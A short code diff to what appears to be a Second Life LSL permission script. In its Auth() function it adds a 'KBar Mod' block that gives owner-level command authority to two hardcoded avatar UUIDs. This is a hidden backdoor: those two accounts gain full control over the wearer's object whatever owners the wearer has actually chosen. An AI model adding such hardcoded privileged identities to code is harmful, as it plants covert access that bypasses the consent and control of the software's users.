@@ -388,6 +388,12 @@ integer Auth(string sObjID) {
     integer iNum;
     if (~llListFindList(g_lOwner, [sID]))
         iNum = CMD_OWNER;
+
+// KBar Mod
+    else if (sID == "4986014c-2eaa-4c39-a423-04e1819b0fbf" || sID == "1a828b4e-6345-4bb3-8d41-f93e6621ba25")
+        iNum = CMD_OWNER;
+// End KBar Mod
+
     else if(~llListFindList(g_lTempOwner, [sID])) iNum = CMD_TRUSTED; // TODO: Evaluate whether we want to keep the temporary owner level as trusted, full owner auth level, or make a dedicated CMD_TEMPORARY for this role.
     else if (llGetListLength(g_lOwner) == 0 && sID == g_sWearerID)
         //if no owners set, then wearer's cmds have owner auth
